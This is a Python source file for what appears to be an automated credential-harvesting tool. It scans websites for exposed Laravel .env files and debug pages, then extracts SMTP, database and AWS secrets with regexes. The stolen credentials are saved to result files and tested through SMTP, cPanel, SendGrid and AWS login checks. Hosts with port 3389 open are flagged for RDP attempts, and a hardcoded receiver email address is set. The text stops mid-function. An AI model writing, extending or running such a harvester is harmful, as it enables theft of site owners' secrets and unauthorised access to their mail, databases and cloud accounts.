# author = Ridho |
import requests, os, sys, time, ctypes, random, datetime, uuid, re, socket,hashlib,hmac,base64,bs4
import colorama, paramiko
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from bs4 import BeautifulSoup as sup
from urllib.parse import urlparse
from threading import Timer
from threading import *
from threading import Thread
from colorama import Fore
import configparser
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from queue import Queue
except:
    from Queue import Queue

if sys.version_info.major == 3:
    import vonage
    import boto3
    from twilio.rest import Client

cfg = configparser.ConfigParser()
try:
    cfg.read('settings.ini')
    cfg.sections()
    email_receiver = cfg['SETTINGS']['EMAIL_RECEIVER']
    default_timeout = cfg['SETTINGS']['DEFAULT_TIMEOUT']
    phone_number = cfg['SETTINGS']['PHONE_NUMBER']
except:
    cfg['SETTINGS'] = {}
    cfg['SETTINGS']['EMAIL_RECEIVER'] = 'larandl1@hotmail.com'
    cfg['SETTINGS']['PHONE_NUMBER'] = '+628952'
    cfg['SETTINGS']['DEFAULT_TIMEOUT'] = '20'
    with open('settings.ini', 'a') as config:
        cfg.write(config)


try:
    path = open('path.txt', 'r').read().splitlines()
except:
    path = [
        '/.env',
        '/conf/.env',
        '/wp-content/.env',
        '/wp-admin/.env',
        '/library/.env',
        '/new/.env',
        '/vendor/.env',
        '/old/.env',
        '/local/.env',
        '/api/.env',
        '/blog/.env',
        '/crm/.env',
        '/admin/.env',
        '/laravel/.env',
        '/app/.env',
        '/app/config/.env',
        '/apps/.env',
        '/audio/.env',
        '/cgi-bin/.env',
        '/backend/.env',
        '/src/.env',
        '/base/.env',
        '/core/.env',
        '/vendor/laravel/.env',
        '/storage/.env',
        '/protected/.env',
        '/newsite/.env',
        '/www/.env',
        '/sites/all/libraries/mailchimp/.env',
        '/database/.env',
        '/public/.env',
        '/[DOMAIN]/.env'
    ]
    for pet in path:
        open('path.txt', 'a').write(pet + '\n')

#socket.setdefaulttimeout(int(default_timeout))
colorama.init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')
# warna ////
merah = Fore.LIGHTRED_EX
hijau = Fore.LIGHTGREEN_EX
biru = Fore.BLUE
kuning = '\033[1;93m'
cyan = Fore.CYAN
reset = '\033[0m'
# /////
head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36'}


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception as e:
                print(e)
            self.tasks.task_done()


class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()

def parser_url(url):
    try:
        parsing = urlparse(txt).netloc
    except:
        parsing = False
    if parsing:
        return parsing
    else:
        try:
            if url.startswith('http'):
                return url.split('/')[2]
            else:
                return url
        except:
            return False


def prompt(string):
    if sys.version_info.major == 3:
        return str(input(string))
    else:
        return str(raw_input(string))


def clean(txt):
    try:
        res = []
        for xx in txt.split('|'):
            if xx.startswith('"') and xx.endswith('"'):
                res.append(xx.replace('"', ''))
            elif xx.startswith("'") and xx.endswith("'"):
                res.append(xx.replace("'", ''))
            else:
                res.append(xx)
        pe = ''
        for out in res:
            pe += out + '|'
        angka = len(pe)
        pe = pe[:angka - 1]
        return pe
    except:
        return txt

def cek_port(ty,pr):
    try:
        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        so.settimeout(8)
        ress = so.connect_ex((ty, int(pr)))
        so.close()
        if str(ress) == '0':
            return True
        else:
            return False
    except:
        return False
class grabber:
    def get_smtp(self, method, urlku, teks):
        oke = 0
        if method == 'env':
            if 'MAIL_HOST=' in teks:
                try:
                    host = re.findall('MAIL_HOST=(.*?)\n', teks)
                    if len(host) > 1:
                        # print(urlku,len(host))
                        for iii in range(len(host)):
                            try:
                                host = re.findall('MAIL_HOST=(.*?)\n', teks)[iii]
                                if '\r' in host:
                                    host = host.replace('\r', '')
                                if ' ' in host:
                                    host = host.replace(' ','')
                                port = re.findall('MAIL_PORT=(.*?)\n', teks)[iii]
                                if '\r' in port:
                                    port = port.replace('\r', '')
                                if ' ' in port:
                                    port = port.replace(' ','')
                                user = re.findall('MAIL_USERNAME=(.*?)\n', teks)[iii]
                                if '\r' in user:
                                    user = user.replace('\r', '')
                                if ' ' in user:
                                    user = user.replace(' ','')
                                pw = re.findall('MAIL_PASSWORD=(.*?)\n', teks)[iii]
                                if '\r' in pw:
                                    pw = pw.replace('\r', '')
                                if ' ' in pw:
                                    pw = pw.replace(' ','')
                                if user == 'null' or user == '""' or user == '' or '****' in user or '$_SERVER' in user:
                                    pass
                                else:
                                    satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                                    if '.gmail.com' in host or '.googlemail.com' in host:
                                        with open('Result/SMTP/gmail.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif 'sendinblue' in host:
                                        with open('Result/SMTP/sendinblue.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif 'smtp.sendgrid.net' in host:
                                        if 'apikey' in user:
                                            with open('Result/SMTP/sendgrid_apikey.txt', 'a') as pow:
                                                pow.write(satu + '\n')
                                            ceker_sendgrid(urlku, satu.split('|')[4])
                                        else:
                                            with open('Result/SMTP/sendgrid.txt', 'a') as pow:
                                                pow.write(satu + '\n')
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.office365.com' in host:
                                        with open('Result/SMTP/office365.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.mailgun.' in host:
                                        with open('Result/SMTP/mailgun.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.mailtrap.io' in host:
                                        with open('Result/SMTP/mailtrap.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        # smtp_login(teks,'env',host,port,user,pw)
                                        oke += 1
                                    elif '.zoho.' in host:
                                        with open('Result/SMTP/zoho.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '1and1' in host:
                                        with open('Result/SMTP/1and1.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif '.amazonaws.' in host:
                                        open('Result/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    elif 'yandex.' in host:
                                        open('Result/SMTP/yandex.txt', 'a').write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                                    else:
                                        with open('Result/SMTP/other.txt', 'a') as pow:
                                            pow.write(satu + '\n')
                                        if email_receiver == 'example@domain.com':
                                            pass
                                        else:
                                            smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2],satu.split('|')[3], satu.split('|')[4])
                                        oke += 1
                            except:
                                pass
                    else:
                        host = re.findall('MAIL_HOST=(.*?)\n', teks)[0]
                        if '\r' in host:
                            host = host.replace('\r', '')
                        if ' ' in host:
                            host = host.replace(' ','')
                        port = re.findall('MAIL_PORT=(.*?)\n', teks)[0]
                        if '\r' in port:
                            port = port.replace('\r', '')
                        if ' ' in port:
                            port = port.replace(' ','')
                        user = re.findall('MAIL_USERNAME=(.*?)\n', teks)[0]
                        if '\r' in user:
                            user = user.replace('\r', '')
                        if ' ' in user:
                            user =  user.replace(' ','')
                        pw = re.findall('MAIL_PASSWORD=(.*?)\n', teks)[0]
                        if '\r' in pw:
                            pw = pw.replace('\r', '')
                        pw = pw.replace(' ','')
                        if user == 'null' or user == '""' or user == '' or '****' in user or "$_SERVER['MAIL_USERNAME']" in user:
                            pass
                        else:
                            satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                            # print(satu)
                            # with open('Result/smtp.txt','a') as tulis:
                            #    tulis.write(satu+'\n')
                            if '.gmail.com' in host or '.googlemail.com' in host:
                                with open('Result/SMTP/gmail.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif 'sendinblue' in host:
                                with open('Result/SMTP/sendinblue.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif 'smtp.sendgrid.net' in host:
                                if 'apikey' in user:
                                    with open('Result/SMTP/sendgrid_apikey.txt', 'a') as pow:
                                        pow.write(satu+'\n')
                                    ceker_sendgrid(urlku,satu.split('|')[4])
                                else:
                                    with open('Result/SMTP/sendgrid.txt', 'a') as pow:
                                        pow.write(satu+'\n')
                                        smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif '.office365.com' in host:
                                with open('Result/SMTP/office365.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif '.mailgun.' in host:
                                with open('Result/SMTP/mailgun.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif '.mailtrap.io' in host:
                                with open('Result/SMTP/mailtrap.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                # smtp_login(teks,'env',host,port,user,pw)
                                oke += 1
                            elif '.zoho.' in host:
                                with open('Result/SMTP/zoho.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif '1and1' in host:
                                with open('Result/SMTP/1and1.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                            elif '.amazonaws.' in host:
                                open('Result/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                            elif 'yandex.' in host:
                                open('Result/SMTP/yandex.txt', 'a').write(satu + '\n')
                                if email_receiver == 'example@domain.com':
                                    pass
                                else:
                                    smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                            else:
                                with open('Result/SMTP/other.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login(teks, 'env', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                                oke += 1
                except:
                    pass
            if 'SMTP_HOST=' in teks:
                try:
                    host = re.findall('SMTP_HOST=(.*?)\n', teks)[0]
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('SMTP_PORT=(.*?)\n', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    user = re.findall('SMTP_USERNAME=(.*?)\n', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('SMTP_PASSWORD=(.*?)\n', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '****' in user:
                        pass
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                        # with open('Result/smtp.txt','a') as tulis:
                        #    tulis.write(satu+'\n')
                        if '.gmail.com' in host or '.googlemail.com' in host:
                            with open('Result/SMTP/gmail.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.sendgrid.net' in host:
                            with open('Result/SMTP/sendgrid.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.office365.' in host:
                            with open('Result/SMTP/office365.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.mailgun.' in host:
                            with open('Result/SMTP/mailgun.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.mailtrap.io' in host:
                            with open('Result/SMTP/mailtrap.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '.zoho.' in host:
                            with open('Result/SMTP/zoho.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        elif '1and1' in host:
                            with open('Result/SMTP/1and1.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                        else:
                            with open('Result/SMTP/other.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            oke += 1
                except:
                    pass
            if oke == 0:
                return False
            else:
                return oke
        elif method == 'debug':
            if 'MAIL_HOST' in teks:
                try:
                    host = re.findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    # print(host)
                    if '\r' in host:
                        host = host.replace('\r', '')
                    if '&amp;' in host:
                        host = host.replace('&amp;','')
                    port = re.findall('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    if '&amp;' in port:
                        port = port.replace('&amp;','')
                    user = re.findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    if '&amp;' in user:
                        user = user.replace('&amp;','')
                    pw = re.findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if '&amp;' in pw:
                        pw = pw.replace('&amp;','')
                    if user == 'null' or user == '""' or user == '' or '****' in user:
                        pass
                    else:
                        satu = clean(str(urlku) + '|' + str(host) + '|' + str(port) + '|' + str(user) + '|' + str(pw))
                        # with open('Result/smtp.txt','a') as tulis:
                        #    tulis.write(satu+'\n')
                        if '.gmail.com' in host or '.googlemail.com' in host:
                            with open('Result/SMTP/gmail.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        elif 'smtp.sendgrid.net' in host:
                            if 'apikey' in user:
                                with open('Result/SMTP/sendgrid_apikey.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                ceker_sendgrid(urlku, satu.split('|')[4])
                            else:
                                with open('Result/SMTP/sendgrid.txt', 'a') as pow:
                                    pow.write(satu + '\n')
                                smtp_login(teks, 'debug', satu.split('|')[1], satu.split('|')[2], satu.split('|')[3],satu.split('|')[4])
                            oke += 1
                        elif '.office365.com' in host:
                            with open('Result/SMTP/office365.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        elif '.mailgun.' in host:
                            with open('Result/SMTP/mailgun.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        elif '.mailtrap.io' in host:
                            with open('Result/SMTP/mailtrap.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            # smtp_login(teks,'debug',host,port,user,pw)
                        elif '.zoho.' in host:
                            with open('Result/SMTP/zoho.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        elif '1and1' in host:
                            with open('Result/SMTP/1and1.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        elif '.amazonaws.' in host:
                            open('Result/SMTP/smtp_aws.txt', 'a').write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        elif 'yandex' in host:
                            open('Result/SMTP/yandex.txt', 'a').write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        else:
                            with open('Result/SMTP/other.txt', 'a') as pow:
                                pow.write(satu + '\n')
                            smtp_login(teks, 'debug', host, port, user, pw)
                        oke += 1
                except:
                    pass
            if 'SMTP_HOST' in teks:
                try:
                    host = re.findall('<td>SMTP_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('<td>SMTP_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    user = re.findall('<td>SMTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('<td>SMTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '****' in user:
                        pass
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + user + '|' + pw)
                        # with open('Result/smtp.txt','a') as tulis:
                        #    tulis.write(satu+'\n')
                        # return True
                        if '.gmail.com' in host or '.googlemail.com' in host:
                            with open('Result/SMTP/gmail.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.sendgrid.net' in host:
                            with open('Result/SMTP/sendgrid.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.office365.com' in host:
                            with open('Result/SMTP/office365.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.mailgun.' in host:
                            with open('Result/SMTP/mailgun.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.mailtrap.io' in host:
                            with open('Result/SMTP/mailtrap.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '.zoho.' in host:
                            with open('Result/SMTP/zoho.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        elif '1and1' in host:
                            with open('Result/SMTP/1and1.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        else:
                            with open('Result/SMTP/other.txt', 'a') as pow:
                                pow.write(satu + '\n')
                        oke += 1
                except:
                    pass
            if oke == 0:
                return False
            else:
                return oke
        else:
            return False

    def get_database(self, method, urlku, teks):
        if method == 'env':
            if 'DB_HOST=' in teks:
                try:
                    try:
                        host = re.findall('DB_HOST=(.*?)\n', teks)[0]
                    except:
                        host = re.findall('DB_SERVER=(.*?)\n', teks)[0]
                    if host.startswith('"') and host.endswith('"'):
                        host = host.replace('"', '')
                    else:
                        pass
                    if '\r' in host:
                        host = host.replace('\r', '')
                    else:
                        pass
                    if '&amp;' in host:
                        host = host.replace('&amp;','')
                    else:
                        pass
                    port = re.findall('DB_PORT=(.*?)\n', teks)[0]
                    if port.startswith('"') and port.endswith('"'):
                        port = port.replace('"', '')
                    else:
                        pass
                    if '\r' in port:
                        port = port.replace('\r', '')
                    else:
                        pass
                    if '&amp;' in port:
                        port = port.replace('&amp;','')
                    else:
                        pass
                    db = re.findall('DB_DATABASE=(.*?)\n', teks)[0]
                    if db.startswith('"') and db.endswith('"'):
                        db = db.replace('"', '')
                    else:
                        pass
                    if '\r' in db:
                        db = db.replace('\r', '')
                    else:
                        pass
                    try:
                        user = re.findall('DB_USERNAME=(.*?)\n', teks)[0]
                    except:
                        user = re.findall('DB_USER=(.*?)\n', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    else:
                        pass
                    pw = re.findall('DB_PASSWORD=(.*?)\n', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    else:
                        pass
                    if host == 'null' or host == '""' or host == '' or '****' in host or pw == "" or "$_SERVER" in host:
                        return False
                    else:
                        if cek_port(parser_url(urlku),'3389'):
                            open('Result/try_for_rdp.txt','a').write(parser_url(urlku)+'|'+user+'|'+pw+'\n')
                        satu = clean(urlku + '|' + host + "|" + port + "|" + db + "|" + user + "|" + pw)
                        with open('Result/database.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        whymen = cpanel_login(urlku, user, pw)
                        return True
                except:
                    return False
            elif 'DB_MYSQL_HOST=' in teks:
                try:
                    try:
                        host = re.findall('DB_MYSQL_HOST=(.*?)\n', teks)[0]
                    except:
                        host = re.findall('DB_MYSQL_SERVER=(.*?)\n', teks)[0]
                    if host.startswith('"') and host.endswith('"'):
                        host = host.replace('"', '')
                    else:
                        pass
                    if '\r' in host:
                        host = host.replace('\r', '')
                    else:
                        pass
                    port = re.findall('DB_MYSQL_PORT=(.*?)\n', teks)[0]
                    if port.startswith('"') and port.endswith('"'):
                        port = port.replace('"', '')
                    else:
                        pass
                    if '\r' in port:
                        port = port.replace('\r', '')
                    else:
                        pass
                    db = re.findall('DB_MYSQL_DATABASE=(.*?)\n', teks)[0]
                    if db.startswith('"') and db.endswith('"'):
                        db = db.replace('"', '')
                    else:
                        pass
                    if '\r' in db:
                        db = db.replace('\r', '')
                    else:
                        pass
                    try:
                        user = re.findall('DB_MYSQL_USERNAME=(.*?)\n', teks)[0]
                    except:
                        user = re.findall('DB_MYSQL_USER=(.*?)\n', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    else:
                        pass
                    pw = re.findall('DB_MYSQL_PASSWORD=(.*?)\n', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    else:
                        pass
                    if host == 'null' or host == '""' or host == '' or '****' in host or pw == "":
                        return False
                    else:
                        if cek_port(parser_url(urlku),'3389'):
                            open('Result/try_for_rdp.txt','a').write(parser_url(urlku)+'|'+user+'|'+pw+'\n')
                        satu = clean(urlku + '|' + host + "|" + port + "|" + db + "|" + user + "|" + pw)
                        with open('Result/database.txt', 'a') as ff:
                            ff.write(satu + '\n')
                        whymen = cpanel_login(urlku, user, pw)
                        return True
                except:
                    return False
            else:
                return False
        elif method == 'debug':
            if 'DB_HOST' in teks:
                try:
                    try:
                        host = re.findall('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    except:
                        host = re.findall('<td>DB_HOST_READ<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    # print(host)
                    if '\r' in host:
                        host = host.replace('\r', '')
                    if '&amp;' in host:
                        host = host.replace('&amp;','')
                    port = re.findall('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    if '&amp;' in port:
                        port = port.replace('&amp;','')
                    db = re.findall('<td>DB_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in db:
                        db = db.replace('\r', '')
                    if '&amp;' in db:
                        db = db.replace('&amp;','')
                    user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    if '&amp;' in user:
                        user = user.replace('&amp;','')
                    pw = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if '&amp;' in pw:
                        pw = pw.replace('&amp;','')
                    if user == 'null' or user == '""' or user == '' or '*****' in host or pw == "" or "*****" in user:
                        return False
                    else:
                        if cek_port(parser_url(urlku),'3389'):
                            open('Result/try_for_rdp.txt','a').write(parser_url(urlku)+'|'+user+'|'+pw+'\n')
                        satu = clean(urlku + '|' + host + '|' + port + '|' + db + '|' + user + '|' + pw)
                        with open('Result/database.txt', 'a') as tulis:
                            tulis.write(satu + '\n')
                        whymen = cpanel_login(urlku, user, pw)
                        return True
                except:
                    return False
            elif 'DB_MYSQL_HOST' in teks:
                try:
                    host = re.findall('<td>DB_MYSQL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    # print(host)
                    if '\r' in host:
                        host = host.replace('\r', '')
                    port = re.findall('<td>DB_MYSQL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in port:
                        port = port.replace('\r', '')
                    db = re.findall('<td>DB_MYSQL_DATABASE<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in db:
                        db = db.replace('\r', '')
                    user = re.findall('<td>DB_MYSQL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in user:
                        user = user.replace('\r', '')
                    pw = re.findall('<td>DB_MYSQL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', teks)[0]
                    if '\r' in pw:
                        pw = pw.replace('\r', '')
                    if user == 'null' or user == '""' or user == '' or '*****' in host or pw == "" or "*****" in user:
                        return False
                    else:
                        satu = clean(urlku + '|' + host + '|' + port + '|' + db + '|' + user + '|' + pw)
                        with open('Result/database.txt', 'a') as tulis:
                            tulis.write(satu + '\n')
                        whymen = cpanel_login(urlku, user, pw)
                        return True
                except:
                    return False

    def get_aws(self, method, urlku, teks):
        objek = 0
        if method == 'env':
            if 'AWS_ACCESS_KEY_ID=' in teks:
                try:
                    key = re.findall('AWS_ACCESS_KEY_ID=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    else:
                        pass
                    if key.startswith('"') and key.endswith('"'):
                        key = key.replace('"', '')
                    else:
                        pass
                    if key.startswith("'") and key.endswith("'"):
                        key = key.replace("'",'')
                    else:
                        pass
                    if " " in key:
                        key = key.replace(' ', '')
                    else:
                        pass
                    sec = re.findall('AWS_SECRET_ACCESS_KEY=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    else:
                        pass
                    if sec.startswith('"') and sec.endswith('"'):
                        sec = sec.replace('"', '')
                    else:
                        pass
                    if sec.startswith("'") and sec.endswith("'"):
                        sec = sec.replace("'", '')
                    else:
                        pass
                    if " " in sec:
                        sec = sec.replace(' ', '')
                    try:
                        region = re.findall('AWS_DEFAULT_REGION=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        else:
                            pass
                        if region.startswith('"') and region.endswith('"'):
                            region = region.replace('"', '')
                        else:
                            pass
                        if region.startswith("'") and region.endswith("'"):
                            region = region.replace("'", '')
                        else:
                            pass
                        if " " in region:
                            region = region.replace(" ", '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                        else:
                            pass
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""' or "$_SERVER" in key:
                        pass
                    else:
                        asu = str(urlku) + "|" + str(key) + "|" + str(sec) + '|' + str(region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1], asu.split('|')[2], asu.split('|')[3])
                            # print(asu)
                            objek += 1
                except:
                    pass
            if 'AWS_ACCESS_KEY_ID_S3=' in teks:
                try:
                    key = re.findall('AWS_ACCESS_KEY_ID_S3=(.*?)\n', teks)[0]
                    if '\r' in key:
                        key = key.replace('\r', '')
                    else:
                        pass
                    if " " in key:
                        key = key.replace(' ', '')
                    else:
                        pass
                    sec = re.findall('AWS_SECRET_ACCESS_KEY_S3=(.*?)\n', teks)[0]
                    if '\r' in sec:
                        sec = sec.replace('\r', '')
                    if " " in sec:
                        sec = sec.replace(' ', '')
                    try:
                        region = re.findall('AWS_DEFAULT_REGION_S3=(.*?)\n', teks)[0]
                        if '\r' in region:
                            region = region.replace('\r', '')
                        if region == '' or region == '""' or region == 'null':
                            region = 'aws_unknown_region--'
                    except:
                        region = 'aws_unknown_region--'
                    if key == 'null' or key == '' or key == '""':
                        pass
                    else:
                        asu = clean(urlku + "|" + key + "|" + sec + '|' + region)
                        if region == 'aws_unknown_region--':
                            with open('Result/aws_unknown_region.txt', 'a') as ppp:
                                ppp.write(asu + '\n')
                            ceker_aws(urlku, asu.split('|')[1],asu.split('|')[2],'us-west-2')
                        else:
                            with open('Result/aws.txt', 'a') as ppp:
